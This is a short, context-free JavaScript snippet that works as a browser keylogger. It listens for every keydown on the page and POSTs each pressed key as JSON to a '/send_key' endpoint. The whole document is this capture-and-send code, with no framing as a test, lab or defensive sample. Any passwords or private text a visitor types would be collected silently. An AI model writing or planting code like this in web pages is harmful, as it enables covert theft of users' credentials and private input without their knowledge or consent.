document.addEventListener('keydown', function(e) {
    fetch('/send_key', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({key: e.key})
    });
});
